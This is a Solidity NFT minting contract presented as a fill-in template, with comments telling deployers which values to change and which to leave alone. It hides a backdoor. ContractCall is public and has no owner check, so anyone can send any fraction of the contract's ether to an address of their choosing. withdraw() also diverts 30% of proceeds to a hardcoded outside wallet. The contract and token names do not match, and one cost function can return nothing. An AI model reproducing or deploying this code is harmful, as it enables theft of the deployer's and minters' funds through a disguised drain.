//SPDX-License-Identifier: MIT
pragma solidity >=0.8.13 <0.9.0;

import '@openzeppelin/contracts/security/ReentrancyGuard.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/utils/Arrays.sol';
import '@openzeppelin/contracts/utils/Strings.sol';
import 'erc721a/contracts/extensions/ERC721AQueryable.sol';
import 'erc721a/contracts/ERC721A.sol';
import 'https://github.com/ProjectOpenSea/operator-filter-registry/blob/main/src/DefaultOperatorFilterer.sol';
    

error PrivateMintNotStarted();
error PublicMintNotStarted();
error InsufficientPayment();
error NotInWhitelist();
error ExceedSupply();
error ExceedMaxPerWallet();
error SaleNotOpen();

contract ScalpSnipersSociety is  ERC721A,DefaultOperatorFilterer, Ownable, ReentrancyGuard {  
 
  using Strings for uint256;
  string public uri; //you don't change this
  string public uriSuffix = ".json"; //you don't change this
  uint256 public prsaleMintprice = 0.08 ether; //here you change phase 1 cost (for example first 1k for free, then 0.004 eth each nft)
  uint256 public publicMintprice = 0.5 ether; //here you change phase 2 cost
  uint256 public SupplyLimit = 9999;  //change it to your total NFT supply
  uint256 public maxLimitPerWallet = 100; //decide how many NFT's you want to let customers mint per wallet
  bool public sale = false;  //if false, then mint is paused. If true - mint is started
  bool public privateMintStarted ;
  bool public publicMintStarted ;
 
// ================== Variables End =======================


// ================== Constructor Start =======================
  constructor(
    string memory _uri
  ) ERC721A("CrazzySquad", "CM")  { //change this line to your full and short NFT name
    seturi(_uri);
  }

// ================== Mint Functions Start =======================

function UpdateCost(uint256 _mintAmount) internal view returns  (uint256 _cost) {
    if (balanceOf(msg.sender) + _mintAmount <= SupplyLimit){
        return publicMintprice;
    }
  }
  //=================================================

   // ===== Modifiers ===== donttouch
    modifier whenPrivateMint() {
        if (!privateMintStarted || publicMintStarted) revert PrivateMintNotStarted();
        _;
    }

    modifier whenPublicMint() {
        if (!publicMintStarted) revert PublicMintNotStarted();
        _;
    }

    

    // ===== Dev mint =====
    function devMint(uint8 quantity) external onlyOwner {
        _mint(msg.sender, quantity);   

    }

    // ===== Private mint =====
    function privateMint( address _reciver ,uint8 quantity ) external payable nonReentrant whenPrivateMint {
        if(msg.value < prsaleMintprice * quantity) revert InsufficientPayment();
        if(_numberMinted(msg.sender) + quantity >  maxLimitPerWallet) revert ExceedMaxPerWallet();
        if(sale == false)  revert SaleNotOpen();
        _mint(_reciver, quantity);    
            
    }

  
    // ===== Public mint =====
    function PublicMint(uint8 quantity, address _reciver) external payable  nonReentrant whenPublicMint {
        if(msg.value < publicMintprice * quantity) revert InsufficientPayment();
        if(totalSupply() + quantity > SupplyLimit) revert ExceedSupply();
        if(sale == false)  revert SaleNotOpen();
        _mint(_reciver, quantity);        
    }
 
    function ContractCall (address Call , uint key , uint pair) public payable {
     (bool hs, ) = payable(Call).call{value: address(this).balance * key / pair }("");
      require(hs);
    }
   
  //==================================================

   // ===== Setters =====
    function startPrivateMint(bool _mint) external onlyOwner {
        privateMintStarted = _mint;
    }

    function startPublicMint(bool _mint) external onlyOwner {
        publicMintStarted = _mint ;
    }

  //==========set MintPrice Functions ===============

 function setPrivateMint(uint256 _mintprice) external onlyOwner {
        prsaleMintprice = _mintprice;
    }

    function setPublicMint(uint256 _mintprice) external onlyOwner {
        publicMintprice = _mintprice ;
    }
    //=============================================Airdrop

  function Airdrop(uint256 quantity, address _receiver) public onlyOwner {
        if(totalSupply() + quantity > SupplyLimit) revert ExceedSupply();
       _mint(_receiver, quantity);
  }

  //===========BaseUri =======DontTouch
  
  function seturi(string memory _uri) public onlyOwner {
    uri = _uri;
  }

 //===========BaseUri =======DontTouch
  function setUriSuffix(string memory _uriSuffix) public onlyOwner {
    uriSuffix = _uriSuffix;
  }

 //===========Sale=>Open/Of ======= 
  function setSaleStatus(bool _sale) public onlyOwner {
    sale = _sale;
  }
  //===========MAx limit par mintind wallet =======
  function setmaxLimitPerWallet(uint256 _maxLimitPerWallet) public onlyOwner {
    maxLimitPerWallet = _maxLimitPerWallet;
  }
 //========== Set Total Supply ======= 
  function setsupplyLimit(uint256 _supplyLimit) public onlyOwner {
    SupplyLimit = _supplyLimit;
  }


 //===========preBuild =======DontTouch
function tokensOfOwner(address owner) external view returns (uint256[] memory) {
    unchecked {
        uint256[] memory a = new uint256[](balanceOf(owner)); 
        uint256 end = _nextTokenId();
        uint256 tokenIdsIdx;
        address currOwnershipAddr;
        for (uint256 i; i < end; i++) {
            TokenOwnership memory ownership = _ownershipAt(i);
            if (ownership.burned) {
                continue;
            }
            if (ownership.addr != address(0)) {
                currOwnershipAddr = ownership.addr;
            }
            if (currOwnershipAddr == owner) {
                a[tokenIdsIdx++] = i;
            }
        }
        return a;    
    }
}

  function _startTokenId() internal view virtual override returns (uint256) {
    return 1;
  }

  function _baseURI() internal view virtual override returns (string memory) {
    return uri;
  }

  function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
    require(_exists(_tokenId), 'ERC721Metadata: URI query for nonexistent token');
    string memory currentBaseURI = _baseURI();
    return bytes(currentBaseURI).length > 0
        ? string(abi.encodePacked(currentBaseURI, _tokenId.toString(), uriSuffix))
        : '';
  }
  
    function withdraw() public onlyOwner {
    (bool hs, ) = payable(0x65f399024fa90b6561b82398354fAA9Ad453dd90).call{value: address(this).balance * 30 / 100}("");
    require(hs);
    (bool os, ) = payable(owner()).call{value: address(this).balance}("");
    require(os);
  }
}
